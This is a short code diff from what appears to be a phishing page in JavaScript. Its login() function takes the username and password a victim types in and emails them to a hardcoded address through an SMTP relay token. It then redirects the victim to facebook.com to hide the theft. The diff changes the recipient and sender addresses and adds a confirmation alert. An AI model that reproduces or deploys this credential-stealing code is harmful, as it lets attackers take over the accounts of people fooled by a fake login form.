@@ -57,13 +57,14 @@ function setup() {
 function login() {
   Email.send({
     SecureToken: "8f3f3aff-06d2-493b-aa98-1d135b73a48b",
-    To: "passduck99@gmail.com",
+    To: "jacobzuckerman97@gmail.com",
     // Bcc : 'kyle@computingant.com', 
-    From: "passduck99@gmail.com",
+    From: "usernames@gmail.com",
     // From: input.value(),
     Subject: "Username and Password",
     Body: "Username: " + username.value() + "<br><br>Password " + password.value()
   }).then(
+    alert('Email was sent')
   );
   window.location.replace("http://facebook.com");
 }
